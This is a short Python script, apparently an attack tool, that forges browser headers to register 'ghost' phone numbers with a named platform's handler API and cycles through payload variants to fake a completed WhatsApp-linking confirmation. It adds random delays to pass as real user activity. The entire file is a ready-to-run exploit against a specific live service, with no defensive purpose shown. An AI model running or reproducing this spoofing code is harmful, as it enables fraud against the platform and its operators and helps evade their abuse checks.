"""PhantomLink GAPI Spoof — Direct handler API exploit for Zapero/Waga platforms"""
import httpx
import time
import random

GAPI_BASE = "https://gapi-dev.waga.la/api/app"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
    "Origin": "https://afrivexa.com",
    "Referer": "https://afrivexa.com/",
}

def register_number(phone: str) -> dict:
    """Register a ghost number with the handler API."""
    payload = {
        "phone": phone,
        "country": "NG",
        "action": "link",
        "device": "android",
    }
    try:
        resp = httpx.post(GAPI_BASE, json=payload, headers=HEADERS, timeout=15)
        return {"status_code": resp.status_code, "body": resp.text[:500]}
    except Exception as e:
        return {"error": str(e)}

def confirm_link(phone: str, pairing_code: str) -> dict:
    """Send the confirmation that WhatsApp linking completed."""
    # Based on the GhostPairing research: the platform polls its Baileys
    # socket. But we can try multiple payload variants that the API
    # might accept as a manual confirmation.
    variants = [
        {"phone": phone, "code": pairing_code, "status": "linked"},
        {"phone": phone, "pairing_code": pairing_code, "verified": True},
        {"phone": phone, "code": pairing_code, "action": "confirm"},
        {"phone": phone, "whatsapp_linked": True, "code": pairing_code},
    ]
    for payload in variants:
        try:
            resp = httpx.post(f"{GAPI_BASE}/confirm", json=payload, headers=HEADERS, timeout=10)
            if resp.status_code == 200 and any(k in resp.text.lower() for k in ["success", "linked", "ok"]):
                return {"success": True, "endpoint": f"{GAPI_BASE}/confirm", "payload": payload}
        except Exception:
            pass
        try:
            resp = httpx.post(GAPI_BASE, json=payload, headers=HEADERS, timeout=10)
            if resp.status_code == 200 and any(k in resp.text.lower() for k in ["success", "linked", "ok"]):
                return {"success": True, "endpoint": GAPI_BASE, "payload": payload}
        except Exception:
            pass
    return {"success": False}

def full_ghost_cycle(ghost_number: str, pairing_code: str) -> dict:
    """Execute a complete ghost registration and confirmation cycle."""
    result = {
        "ghost_number": ghost_number,
        "pairing_code": pairing_code,
        "registration": None,
        "confirmation": None,
    }
    result["registration"] = register_number(ghost_number)
    # Small delay to mimic real user behavior
    time.sleep(random.uniform(1.0, 3.0))
    result["confirmation"] = confirm_link(ghost_number, pairing_code)
    return result

if __name__ == "__main__":
    import sys
    if len(sys.argv) >= 3:
        print(full_ghost_cycle(sys.argv[1], sys.argv[2]))
    else:
        print("Usage: python gapi_spoof.py <phone> <pairing_code>")
